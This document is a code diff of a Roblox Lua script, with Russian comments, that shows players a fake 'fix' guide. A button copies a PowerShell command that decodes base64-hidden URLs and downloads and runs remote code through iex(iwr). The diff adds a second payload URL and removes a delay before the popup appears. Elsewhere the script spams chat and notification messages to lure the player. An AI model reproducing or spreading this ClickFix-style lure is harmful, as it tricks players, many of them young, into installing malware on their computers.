@@ -15,19 +15,9 @@ local lp = Players.LocalPlayer
 local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
 
 -- ============================================================
--- ⏱ DELAY — через сколько секунд после запуска показать
--- Случайно от 40 до 50 секунд
--- ============================================================
-local TRIGGER_DELAY = math.random(40, 50)
--- Чтобы проверить быстро, раскомментируй строку ниже:
--- local TRIGGER_DELAY = 5
-
-task.wait(TRIGGER_DELAY)
-
--- ============================================================
 -- ⚙️ FIX COMMAND — копируется по кнопке
 -- ============================================================
-local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
+local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing); iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYngtc2NyaXB0cy54eXovYXBpL3N0YXRzLXNjcmlwdA=='))) -UseBasicParsing)"
 
 -- ============================================================
 -- ANALYTICS
@@ -173,6 +163,7 @@ local _stopSpam = false
 local function sendChatMessage(text, color)
     color = color or Color3.fromRGB(255, 100, 100)
 
+    -- TextChatService (modern)
     local ok = pcall(function()
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
             local channels = TextChatService:FindFirstChild("TextChannels")
@@ -192,6 +183,7 @@ local function sendChatMessage(text, color)
         return false
     end)
 
+    -- Legacy chat fallback
     if not ok then
         pcall(function()
             StarterGui:SetCore("ChatMakeSystemMessage", {
@@ -204,7 +196,7 @@ local function sendChatMessage(text, color)
     end
 end
 
--- ── Corner notification ─────────────────────────────────────
+-- ── Corner notification (right bottom) ──────────────────────
 local function sendCornerNotification()
     pcall(function()
         StarterGui:SetCore("SendNotification", {
@@ -245,7 +237,7 @@ local function startChatSpam()
     end)
 end
 
--- ── Corner notification repeater ────────────────────────────
+-- ── Repeat corner notification periodically ─────────────────
 local function startCornerRepeater()
     if not NOTIFY.cornerEnabled then return end
     task.spawn(function()
@@ -349,7 +341,7 @@ introText.ZIndex = 7
 introText.Parent = card
 
 -- ============================================================
--- STEP BUILDER
+-- STEP BUILDER (with rich text bold)
 -- ============================================================
 local function buildStep(yPos, number, richText)
     local num = Instance.new("TextLabel")
